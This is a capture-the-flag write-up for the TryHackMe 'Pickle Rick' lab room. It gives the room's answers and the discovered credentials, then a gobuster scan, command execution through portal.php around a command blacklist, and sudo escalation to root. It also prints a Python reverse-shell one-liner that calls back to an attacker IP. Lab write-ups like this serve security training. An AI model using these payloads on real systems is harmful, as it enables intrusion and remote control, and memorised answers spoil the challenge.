## TryHackMe | Pickle Rick
https://tryhackme.com/room/picklerick

---

IP: 10.10.37.39
URL: https://10-10-37-39.p.thmlabs.com/

### Questions: 
1. What is the first ingredient Rick needs?\  
Answer: mr. meeseek hair\
Location: http://10.10.37.39/Sup3rS3cretPickl3Ingred.txt or `/var/www/html/Sup3rS3cretPickl3Ingred.txt`

2. Whats the second ingredient Rick needs?\  
Answer: 1 jerry tear\
Location:` /home/rick/"second ingredients"`

3. Whats the final ingredient Rick needs?\
Answer: fleeb juice\
Location: `/root/3rd.txt`

---
### Methods

From url:\
Username: R1ckRul3s

From robots.txt:\
Password: Wubbalubbadubdub


1. Run gobuster scan with extensions lookup (txt,html,css,js,py,php)
> ```bash
> gobuster dir -u http://10.10.246.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,css,js,html,txt,py,cgi,sh
> ```

2. Go to the URL as above, respective to given IP.
3. From the gobuster results, go to the `portal.php` page. 
4. Using the username and password received in index.html and robots.txt respectively, login to portal page.
5. Run `ls` command to find the first secret ingredient text file. Use `less` to display the file since cat, more and others are blacklisted. Read the notes below**
> Inspect the `portal.php` for blacklisted command
> 
> Blacklisted command:
> > "cat", "head", "more", "tail", "nano", "vim", "vi"
6. You have found all the info needed to find the second ingredients in `/home/rick`
7. Check `sudo -l` to find what can be run as sudo
8. Use sudo to display the file in /root by running the command in the `portal.php` command field
> ```bash
> sudo less /root/3rd.txt
> ```


**Another method to solve all this is by establishing reverse shell connection thru the `portal.php` command field. **

1. Setup netcat listener at port 9999
2. Run the following python revshell payload into the `portal.php` command field.
Python3 revshell payload:
> ```bash
> python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.26.94",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
> ```
3. In this machine, the user has unlimited sudo privilege. go to root with `sudo bash`

---
### Notes

- Alternatives to cat,more,less
> `grep . <filename>`

- Inspect `portal.php` for restricted commands
- There is a base64 text in `portal.php` that translated to "rabbit hole"
> Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

- Alternatively, run python and netcat to establish reverse shell
